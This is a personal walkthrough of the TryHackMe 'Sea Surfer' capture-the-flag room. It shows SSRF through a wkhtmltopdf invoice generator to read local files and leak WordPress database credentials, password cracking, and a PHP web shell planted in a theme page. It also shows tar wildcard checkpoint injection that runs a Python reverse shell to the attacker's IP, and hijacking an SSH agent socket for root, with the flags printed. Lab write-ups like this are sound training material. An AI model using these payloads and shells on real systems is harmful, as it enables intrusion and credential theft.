CTF URL: https://tryhackme.com/r/room/seasurfer
# IP
```
10.10.137.138
```
# Reconaisance
## NMAP
```bash
nmap -p- -T4 10.10.137.138 -v
22,80
```
# Port 80
Apache
```req
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.137.138/ -v                                              

*   Trying 10.10.137.138:80...
* Connected to 10.10.137.138 (10.10.137.138) port 80
> GET / HTTP/1.1
> Host: 10.10.137.138
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Thu, 11 Apr 2024 06:25:01 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Last-Modified: Sun, 17 Apr 2022 18:54:09 GMT
< ETag: "2aa6-5dcde2b3f2ff9"
< Accept-Ranges: bytes
< Content-Length: 10918
< Vary: Accept-Encoding
< X-Backend-Server: seasurfer.thm
< Content-Type: text/html
< 
```
`X-Backend-Server: seasurfer.thm`
let's add it to `/etc/hosts`
it returns new website
# seasurfer.thm
## Manual Enumeration
wordpress
wordpress user: `kyle`
```users
Maya Martins - owner
Brandon Baker - salesman
Kyle King - sysadmin
```
subdomain: `intrenal.seasurfer.thm` (found in comment)
login page: `seasurfer.thm/wp-admin` - only `kyle` username exists

## brute force
```bash
wpscan --url http://seasurfer.thm -e u
# it will say that only kyle exists

wpscan --url http://seasurfer.thm -U kyle -P /usr/share/wordlists/rockyou.txt
```
## dirb
```bash
dirb http://seasurfer.thm
# result
http://seasurfer.thm/atom
```
nothing interesting
## gobuster
```bash
gobuster -w /usr/share/wordlists/dirb/big.txt dir -u http://seasurfer.thm/ 
# result
http://seasurfer.thm/adminer/
```
# adminer
`http://seasurfer.thm/adminer/` is smth like phpmyadmin
# internal.seasurfer.thm
add this to hosts file
## manual enumeration
there is `index.php` and `output.php`
```http
http://internal.seasurfer.thm/output.php?name=%27&payment=%27&comment=%27&item1=%27&price1=%27
```
## dirb
```bash
dirb http://internal.seasurfer.thm
# result
/invoices
/maintenance
```
## HTML to PDF SSRF
https://docs.google.com/presentation/u/0/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent?pli=1

html to pdf generators are vulnerable sometimes.
`<img src=x onerror=document.write(1337)>` will show that it is.
`<iframe src="http://10.8.97.245:1234/> ` and netcat listener will reveal
```
└─$ nc -lvnp 1234                         
listening on [any] 1234 ...
connect to [10.8.97.245] from (UNKNOWN) [10.10.137.138] 49178
GET /%3E%20%3Cbr%3EAdditional%20information:%20%3C/td%3E%3C/tr%3E%3C/table%3E%3C/td%3E%3C/tr%3E%3Ctr%20class= HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://internal.seasurfer.thm/invoice.php?name=%3Ciframe+src%3D%22http%3A%2F%2F10.8.97.245%3A1234%2F%3E+&payment=Credit+card&comment=&item1=&price1=2&id=11042024-XqHlo0EgQVID8PCHZ8uR
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 10.8.97.245:1234

```
`wkhtlmtopdf` is used

host this php file 
```php
<?php
$loc = "http://127.0.0.1/"; if(isset($_GET['p'])){ $loc = $_GET['p']; } header('Location: '.$loc);
?>
```
host with
```bash
php -S 0.0.0.0:80
```
payload to website:
```
<iframe height=3000 src="http://10.8.97.245/index.php?p=file:///etc/passwd">
```
it works

`/var/www/wordpress/wp-config.php`
```php
WordPress */
define( 'DB_NAME', 'wordpress' );
/** Database username */
define( 'DB_USER', 'wordpressuser' );
/** Database password */
define( 'DB_PASSWORD',
'coolDataTablesMan' );
/** Database hostname */
define( 'DB_HOST', 'localhost' );
/** Database charset to use in creating
database tables. */
define( 'DB_CHARSET', 'utf8' );
/** The database collate type. Don't change
this if in doubt. */
define( 'DB_COLLATE', '' );
```

# Adminer
credentials give access to the page.
`kyle:$P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/`
cracking it:
```bash
echo '$P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/' > hash
john -w=/usr/share/wordlists/rockyou.txt hash
```
`kyle:jenny4ever`
# Wordpress -> Shell
```php
<?php system($_GET['cmd']);?>
```
into 404 page
and it works
```bash
http://seasurfer.thm/asdasd?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

```
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.97.245] from (UNKNOWN) [10.10.137.138] 49238
Linux seasurfer 5.4.0-107-generic #121-Ubuntu SMP Thu Mar 24 16:04:27 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 09:22:20 up  3:11,  1 user,  load average: 0.01, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# ctrl+z
stty raw -echo; fg
```
# PrivEsc to User
```
www-data@seasurfer:/var/www/internal$ cd maintenance/
www-data@seasurfer:/var/www/internal/maintenance$ cat backup.sh 
#!/bin/bash

# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
# Still need to come up with a better backup system, perhaps a cloud provider?

cd /var/www/internal/invoices
tar -zcf /home/kyle/backups/invoices.tgz *
```
there is wildcard in tar command
https://www.gnu.org/software/tar/manual/html_section/checkpoints.html
then create a shell and a checkpoint
```bash
echo $'/usr/bin/python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.97.245\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")\'' > shell.sh

echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

```bash
└─$ nc -lvnp 1337                         
listening on [any] 1337 ...
connect to [10.8.97.245] from (UNKNOWN) [10.10.137.138] 42634
$ whoami
whoami
kyle
```

```bash
kyle@seasurfer:~$ cat user.txt 
THM{SSRFING_TO_LFI_TO_RCE}
```
# Priv Esc to root
```bash
kyle@seasurfer:~/.ssh$ groups
kyle adm cdrom sudo dip www-data plugdev

kyle@seasurfer:~/.ssh$ ps aux | grep root
kyle        1191  0.0  0.1   6892  2348 pts/0    Ss+  06:12   0:00 bash -c sudo /root/admincheck; sleep infinity
```

have a good ssh connection to machine 
```bash
ssh-keygen
# it will generate id_rsa and id_rsa.pub
cat id_rsa.pub > authorized_keys
# move id_rsa to your machine and 
chmod 600 id_rsa
ssh kyle@seasurfer.thm -i id_rsa
```

```
kyle@seasurfer:~$ cat /etc/pam.d/sudo
#%PAM-1.0

auth sufficient pam_ssh_agent_auth.so file=/etc/ssh/sudo_authorized_keys

session    required   pam_env.so readenv=1 user_readenv=0
session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0
@include common-auth
@include common-account
@include common-session-noninteractive:

```

ssh agent
```bash
kyle@seasurfer:~$ ps aux | grep sshd
root         735  0.0  0.3  12172  6788 ?        Ss   10:36   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
kyle        1139  0.0  0.2  13924  5992 ?        S    10:37   0:00 sshd: kyle@pts/0
kyle@seasurfer:~$ ps aux | grep adminch
kyle        1140  0.0  0.1   6892  3236 pts/0    Ss+  10:37   0:00 bash -c sudo /root/admincheck; sleep infinity

kyle@seasurfer:~$ ls /tmp/ssh-6GlVO04FkZ/agent.1139 -l
srwxrwxr-x 1 kyle kyle 0 Apr 11 10:37 /tmp/ssh-6GlVO04FkZ/agent.1139

export SSH_AUTH_SOCK=/tmp/ssh-6GlVO04FkZ/agent.1139

ssh-add -l
sudo -l

root@seasurfer:~# cat root.txt 
THM{STEALING_SUDO_TOKENS}
```


